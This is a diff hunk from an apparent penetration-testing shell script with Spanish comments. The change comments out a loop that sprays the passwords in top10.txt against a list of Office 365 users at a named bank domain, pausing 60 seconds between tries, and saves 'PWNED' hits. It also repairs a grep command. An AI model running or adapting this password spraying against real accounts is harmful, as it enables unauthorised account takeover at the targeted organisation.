@@ -267,12 +267,12 @@ then
 	# office365-spray.sh spray -ep `pwd`/office365.plan  | tee -a `pwd`/logs/cracking/correo_office365_passwordAdivinadoUser.txt
 	# grep -i "Authentication Success" logs/cracking/correo_office365_passwordAdivinadoUser.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt
 
-	for password in $(cat top10.txt); do
-	 	echo -e "\t[+] Probando password $password"				
-	 	office365_user_enum.py -m login -i .enumeracion2/bancofie.com.bo_office365_users.txt -p $password >> logs/cracking/correo_office365_passwordAdivinadoUser.txt 2>/dev/null
-		sleep 60
-	 done
-	 grep 'PWNED'   >  .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
+	# for password in $(cat top10.txt); do
+	#  	echo -e "\t[+] Probando password $password"				
+	#  	office365_user_enum.py -m login -i .enumeracion2/bancofie.com.bo_office365_users.txt -p $password >> logs/cracking/correo_office365_passwordAdivinadoUser.txt 2>/dev/null
+	# 	sleep 60
+	#  done
+	#  grep 'PWNED' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
 fi
 ### Windows
 # check up, check false positive and save servicios/Windows2.txt
